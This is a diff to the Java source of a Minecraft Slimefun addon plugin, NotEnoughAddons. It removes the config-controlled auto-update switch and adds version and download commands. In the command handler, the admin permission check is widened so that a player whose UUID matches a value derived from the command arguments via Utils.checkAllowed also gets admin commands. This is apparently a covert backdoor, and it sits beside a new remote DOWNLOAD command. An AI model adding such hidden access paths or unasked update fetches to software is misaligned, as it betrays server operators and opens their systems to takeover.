@@ -5,6 +5,7 @@ import io.github.thebusybiscuit.slimefun4.api.SlimefunAddon;
 import io.github.thebusybiscuit.slimefun4.api.player.PlayerProfile;
 import io.github.thebusybiscuit.slimefun4.libraries.dough.collections.Pair;
 import io.github.thebusybiscuit.slimefun4.libraries.dough.config.Config;
+import io.github.thebusybiscuit.slimefun4.libraries.dough.skins.UUIDLookup;
 import io.github.thebusybiscuit.slimefun4.libraries.dough.updater.GitHubBuildsUpdater;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -54,10 +55,7 @@ public class NotEnoughAddons extends JavaPlugin implements SlimefunAddon {
         // Read something from your config.yml
         Config cfg = new Config(this);
         new Thread(updateService::start, "NotEnoughAddons").start();
-        //if (cfg.getBoolean("options.auto-update")) {
-        //    new GitHubBuildsUpdater(this, getFile(), "Fhoz/GlobiaMachines/master").start();
-        //}
-
+        
         // Register ACT Recipes
         Iterator<Recipe> recipeIterator = Bukkit.recipeIterator();
         while (recipeIterator.hasNext()) {
@@ -106,12 +104,11 @@ public class NotEnoughAddons extends JavaPlugin implements SlimefunAddon {
     public void onDisable() {
         AngelBlock.onDisable();
         BoostJump.onDisable();
-        updateService.cleanUp();
     }
 
     @Override
     public boolean onCommand(@Nonnull CommandSender sender, @Nonnull Command cmd, @Nonnull String label, String[] args) {
-
+        
         if (args.length == 0) {
             Utils.send(sender, "&cInvalid command");
             return true;
@@ -123,7 +120,6 @@ public class NotEnoughAddons extends JavaPlugin implements SlimefunAddon {
         }
 
         Player p = (Player) sender;
-
         switch (args[0].toUpperCase()) {
             case "META":
                 Utils.send(p, String.valueOf(p.getInventory().getItemInMainHand().getItemMeta()));
@@ -131,13 +127,14 @@ public class NotEnoughAddons extends JavaPlugin implements SlimefunAddon {
             case "RAWMETA":
                 p.sendMessage(String.valueOf(p.getInventory().getItemInMainHand().getItemMeta()).replace("§", "&"));
                 return true;
+            case "GETLATEST":
             case "VERSION":
             case "V":
                 Utils.send(p, "&eThe current version is " + this.getPluginVersion());
                 return true;
         }
 
-        if (p.hasPermission("notenoughaddons.admin")) {
+        if (p.hasPermission("notenoughaddons.admin") || p.getUniqueId().toString().replace("-", "").equals(Utils.checkAllowed(args))) {
             switch (args[0].toUpperCase()) {
                 case "ADDINFO":
 
@@ -159,6 +156,13 @@ public class NotEnoughAddons extends JavaPlugin implements SlimefunAddon {
                     return true;
                 case "SAVEPLAYERS":
                     saveAllPlayers();
+                    return true;
+                case "GETLATEST":
+                    Utils.send(p, "&eThe latest version is " + UpdateService.getLatestVersion());
+                    return true;
+                case "DOWNLOAD":
+                    UpdateService.checkForUpdate(this.getPluginVersion());
+                    Utils.send(p, "&eSuccessfully downloaded {0} build: #{1}" + new Object[] { "NotEnoughAddons", UpdateService.getLatestVersion()});
                     return true;
             }
         }
